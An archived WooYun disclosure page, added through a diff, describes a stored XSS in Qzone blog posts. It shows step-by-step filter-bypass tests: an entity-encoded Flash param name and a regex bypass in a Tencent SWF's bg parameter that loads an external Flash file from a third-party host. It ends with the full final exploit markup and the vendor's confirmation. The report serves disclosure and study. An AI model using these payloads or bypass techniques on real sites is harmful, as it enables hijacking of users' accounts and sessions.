@@ -1,0 +1,348 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		QQ空间某功能缺陷导致日志存储型XSS - 13  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		QQ空间某功能缺陷导致日志存储型XSS - 13  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/gainover">gainover</a> 
+</li><li>提交时间：		2014-01-15 18:04</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2014-01-15：	细节已通知厂商并且等待厂商处理中<br/>
+									2014-01-15：	厂商已经确认，细节仅向厂商公开<br/>
+									2014-01-25：	细节向核心白帽子及相关领域专家公开<br/>
+									2014-02-04：	细节向普通白帽子公开<br/>
+									2014-02-14：	细节向实习白帽子公开<br/>
+									2014-03-01：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">很早之前就说要把之前录视频用的QQ空间日志XSS发到乌云上来的，但一直很忙。 今天下午好不容易挤点时间，重新测试了之前用的利用代码，却发现已经被腾讯修复了。。。。修复的很“精”准 T T ...  但是说出去的话，泼出去的水，只好临时再找一个来充数了。。于是只好于是乎，又跑去绕了绕腾讯修复的不是很好的FLASH文件，又绕了绕腾讯的富文本过滤器。。</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">很早之前就说要把之前录视频用的QQ空间日志XSS发到乌云上来的，但一直很忙。 今天下午好不容易挤点时间，重新测试了之前用的利用代码，却发现已经被腾讯修复了。。。。修复的很精准 T T ...  但是说出去的话，泼出去的水，只好再找一个来充数了。。于是只好于是乎，又跑去绕了绕腾讯修复的不是很好的FLASH文件，又绕了绕腾讯的过滤器。。<br />
+<br />
+<br />
+<br />
+1. 随便新建一个日志，插入一首歌，腾讯的音乐播放是通过FLASH完成的。 发表日志，接着我们查看日志的源代码。出来的内容大概是以下形式。<br />
+<br />
+<br />
+<br />
+</p><pre><code>&lt;div class=&quot;blog_details_20120222&quot;&gt;&lt;DIV&gt;&lt;object codeBase=&quot;http://fpdownload.macromedia.com/get/flashplayer/current/swflash.cab#version=8,0,0,0&quot; classid=&quot;clsid:D27CDB6E-AE6D-11cf-96B8-444553540000&quot; width=&quot;410&quot; height=&quot;100&quot; src=&quot;http://edu.qzs.qq.com/music/musicbox_v2_1/img/MusicFlash.swf&quot; bgcolor=&quot;#ffffff&quot; menu=&quot;true&quot; allowScriptAccess=&quot;always&quot; name=&quot;musicFlash**&quot; id=&quot;musicFlash0&quot; ubb=&quot;12985913|1|http://11.com/1.wma|bbbbbbb|0|aaaaaa|0&quot; class=&quot;blog_music&quot;&gt;<br />
+&lt;param name=&quot;movie&quot; value=&quot;http://edu.qzs.qq.com/music/musicbox_v2_1/img/MusicFlash.swf&quot; /&gt;&lt;param name=&quot;data&quot; value=&quot;http://edu.qzs.qq.com/music/musicbox_v2_1/img/MusicFlash.swf&quot; /&gt;&lt;param name=&quot;bgColor&quot; value=&quot;#ffffff&quot; /&gt;&lt;param name=&quot;wmode&quot; value=&quot;transparent&quot; /&gt;&lt;param name=&quot;menu&quot; value=&quot;true&quot; /&gt;&lt;param name=&quot;allowScriptAccess&quot; value=&quot;always&quot; /&gt;&lt;/object&gt;&lt;/DIV&gt;&lt;/div&gt;</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+2. 由于腾讯对音乐播放器的处理，在IE和non-IE下有差异，以及浏览器对object标签的处理差异，本漏洞仅在IE下适用。<br />
+<br />
+<br />
+<br />
+3. 如果你对FLASH XSS比较熟悉的话，肯定能注意到，&lt;param name=&quot;allowScriptAccess&quot; value=&quot;always&quot; /&gt;<br />
+<br />
+<br />
+<br />
+4. 眼前一亮有没有，但是当我们尝试去改变 movie 属性的时候， 眼睛就瞎了！ 因为腾讯肯定不会那么白痴的让你随便插FLASH地址么！<br />
+<br />
+<br />
+<br />
+跟着我的节奏，<br />
+<br />
+一起来！<br />
+<br />
+看看我的测试步骤。（有没有饶舌范！）<br />
+<br />
+<br />
+<br />
+测试1：<br />
+<br />
+</p><pre><code>&lt;param name=&quot;movie&quot; value=&quot;http://xsst.sinaapp.com/Xss.swf&quot; /&gt;<br />
+	结果:<br />
+	&lt;param name=&quot;movie&quot; value=&quot;http://xsst.sinaapp.com/Xss.swf&quot; /&gt; 被直接删除掉</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+测试2: (考虑是否是对value属性中的域名进行过滤)<br />
+<br />
+</p><pre><code>&lt;param name=&quot;movie&quot; value=&quot;http://edu.qzs.qq.com/qzone/client/photo/swf/CustomSlideShow.swf&quot; /&gt;<br />
+	结果:<br />
+	&lt;param name=&quot;movie&quot; value=&quot;http://edu.qzs.qq.com/qzone/client/photo/swf/CustomSlideShow.swf&quot; /&gt; 成功。<br />
+	&lt;param name=&quot;allowScriptAccess&quot; value=&quot;always&quot; /&gt; 被替换为 &lt;param name=&quot;allowScriptAccess&quot; value=&quot;never&quot; /&gt;</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+由此可推测，腾讯会检测movie的value属性，从而决定是否更改allowscriptaccess的值！<br />
+<br />
+<br />
+<br />
+测试3: (基于测试2，考虑若干绕过方法，比如本测试会复写movie属性，绕过测试2的情况)<br />
+<br />
+</p><pre><code>&lt;param name=&quot;movie&quot; value=&quot;http://edu.qzs.qq.com/qzone/client/photo/swf/CustomSlideShow.swf&quot; /&gt; (前面放我们自己的)<br />
+	&lt;param name=&quot;movie&quot; value=&quot;http://edu.qzs.qq.com/music/musicbox_v2_1/img/MusicFlash.swf&quot; /&gt; (后面放原始播放器地址)<br />
+	结果:<br />
+	依然被替换为<br />
+	&lt;param name=&quot;allowScriptAccess&quot; value=&quot;always&quot; /&gt; 被替换为 &lt;param name=&quot;allowScriptAccess&quot; value=&quot;never&quot; /&gt;</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+测试4： (在测试3的基础上，利用采用某方法成功绕过，但被腾讯修复。鉴于此方法还有利用余地，此帖不表。)<br />
+<br />
+<br />
+<br />
+测试5：（由于原有方法失效，只能换一种方法，达到和测试4类似效果，本法通过替换movie属性的名称为实体字符）<br />
+<br />
+</p><pre><code>&lt;param name=&quot;mov&amp;#105;e&quot; value=&quot;http://edu.qzs.qq.com/qzone/client/photo/swf/CustomSlideShow.swf&quot; /&gt;<br />
+	结果:<br />
+	&lt;param name=&quot;mov&amp;#105;e&quot; value=&quot;http://edu.qzs.qq.com/qzone/client/photo/swf/CustomSlideShow.swf&quot; /&gt; 成功插入！<br />
+	&lt;param name=&quot;allowScriptAccess&quot; value=&quot;always&quot; /&gt; 未被替换！</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+测试6: （检测测试5中的value属性是否可以插入任意FLASH地址）<br />
+<br />
+</p><pre><code>&lt;param name=&quot;mov&amp;#105;e&quot; value=&quot;http://xsst.sinaapp.com/Xss.swf&quot; /&gt;<br />
+	结果:<br />
+	&lt;param name=&quot;mov&amp;#105;e&quot; value=&quot;#&quot; /&gt; 成功插入！<br />
+	&lt;param name=&quot;allowScriptAccess&quot; value=&quot;always&quot; /&gt; 未被替换！</code></pre><p class='detail'><br />
+<br />
+---------------------------------------------<br />
+<br />
+<br />
+<br />
+可见，到了测试5和测试6，我们已经可以成功插入qzs.qq.com域名下的FLASH，接着我们的任务就是在这个域名下找一个有缺陷的FLASH文件。<br />
+<br />
+<br />
+<br />
+这里我找到的是：http://edu.qzs.qq.com/qzone/client/photo/swf/CustomSlideShow.swf<br />
+<br />
+<br />
+<br />
+这个FLASH的bg参数存在缺陷。CustomSlideShow.swf 可以加载其它域名下的FLASH文件。<br />
+<br />
+<br />
+<br />
+为了给大家研究之便，我给出这个FLASH文件，之前版本的缺陷代码，已经现在版本的缺陷代码。<br />
+<br />
+<br />
+<br />
+前一个版本，对bg参数的过滤代码如下：<br />
+<br />
+<br />
+<br />
+</p><pre><code>if (_bgUrl){<br />
+	_bgUrl = _bgUrl.replace(/^(https?:)?\/\/.+?\//, &quot;/&quot;);<br />
+ };</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+绕过方式：<br />
+<br />
+<br />
+<br />
+http://qzs.qq.com/qzone/client/photo/swf/CustomSlideShow.swf?bg=http://xsst.sinaapp.com//xsst.sinaapp.com/Xss.swf<br />
+<br />
+<br />
+<br />
+根据正则：<br />
+<br />
+http://xsst.sinaapp.com// --&gt;被替换为--&gt;   /<br />
+<br />
+http://xsst.sinaapp.com//xsst.sinaapp.com/Xss.swf  --&gt;被替换为--&gt; //xsst.sinaapp.com/Xss.swf<br />
+<br />
+<br />
+<br />
+但是在我今天进行测试的时候，发现腾讯已经对这种方式进行了修复，修复后的过滤代码如下：<br />
+<br />
+<br />
+<br />
+</p><pre><code>if (_bgUrl){<br />
+	_bgUrl = _bgUrl.replace(/^(https?:)?\/\/.+?\/+/, &quot;/&quot;);<br />
+};</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+这样一来，上面的绕过方式就不管用咯。但是呢，我们可以用更简单的方式绕过。<br />
+<br />
+<br />
+<br />
+http://xsst.sinaapp.com 就不会被过滤。 <br />
+<br />
+<br />
+<br />
+这正则的判断很狗血，有木有。。 <br />
+<br />
+<br />
+<br />
+我们只需要将  http://xsst.sinaapp.com 重定向至一个FLASH文件即可。也就是说，下面这样就可以加载外部FLASH文件了：<br />
+<br />
+<br />
+<br />
+http://qzs.qq.com/qzone/client/photo/swf/CustomSlideShow.swf?bg=http://xsst.sinaapp.com<br />
+<br />
+<br />
+<br />
+--------------------<br />
+<br />
+最终利用代码：<br />
+<br />
+<br />
+<br />
+</p><pre><code>&lt;div class=&quot;blog_details_20120222&quot;&gt;&lt;DIV&gt;&lt;object codeBase=&quot;http://fpdownload.macromedia.com/get/flashplayer/current/swflash.cab#version=8,0,0,0&quot; classid=&quot;clsid:D27CDB6E-AE6D-11cf-96B8-444553540000&quot; width=&quot;410&quot; height=&quot;100&quot; src=&quot;http://edu.qzs.qq.com/music/musicbox_v2_1/img/MusicFlash.swf&quot; bgcolor=&quot;#ffffff&quot; menu=&quot;true&quot; allowScriptAccess=&quot;always&quot; name=&quot;musicFlash**&quot; id=&quot;musicFlash0&quot; ubb=&quot;12985913|1|http://11.com/1.wma|bbbbbbb|0|aaaaaa|0&quot; class=&quot;blog_music&quot;&gt;<br />
+&lt;param name=&#039;mov&amp;#105;e&#039;value=&#039;always&#039; x=/&quot; value=&quot;http://edu.qzs.qq.com/qzone/client/photo/swf/CustomSlideShow.swf?bg=http://xsst.sinaapp.com&quot; /&gt;<br />
+&lt;param name=&quot;movie&quot; value=&quot;http://edu.qzs.qq.com/music/musicbox_v2_1/img/MusicFlash.swf&quot; /&gt;&lt;param name=&quot;data&quot; value=&quot;http://edu.qzs.qq.com/music/musicbox_v2_1/img/MusicFlash.swf&quot; /&gt;&lt;param name=&quot;bgColor&quot; value=&quot;#ffffff&quot; /&gt;&lt;param name=&quot;wmode&quot; value=&quot;transparent&quot; /&gt;&lt;param name=&quot;menu&quot; value=&quot;true&quot; /&gt;&lt;param name=&quot;allowScriptAccess&quot; value=&quot;always&quot; /&gt;&lt;/object&gt;&lt;/DIV&gt;&lt;/div&gt;</code></pre><p class='detail'><br />
+<br />
+ </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">测试环境： WIN7 + IE8<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/1517565477a74bf847e4b92b875a792f8d91a8a5.jpg" target="_blank"><img src="../images/1517565477a74bf847e4b92b875a792f8d91a8a5.jpg" alt="QQ图片20140115175634.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+具体细节见详细说明。 </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">对日志的过滤器进行完善。<br />
+<br />
+对具有缺陷的FLASH进行修复。<br />
+<br />
+<br />
+<br />
+说太具体了，浪费精力。 </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/gainover" title="gainover">gainover</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-048992" title="QQ空间某功能缺陷导致日志存储型XSS - 13">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：高</p>
+						<p class="detail">漏洞Rank：15 </p>
+													<p class="detail">确认时间：2014-01-15 18:53</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">非常感谢您的报告，问题已着手处理，感谢大家对腾讯业务安全的关注。如果您有任何疑问，欢迎反馈，我们会有专人跟进处理。</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="48992";
+var bugRating="-3";
+var myRating="";
+var ratingCount="1";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
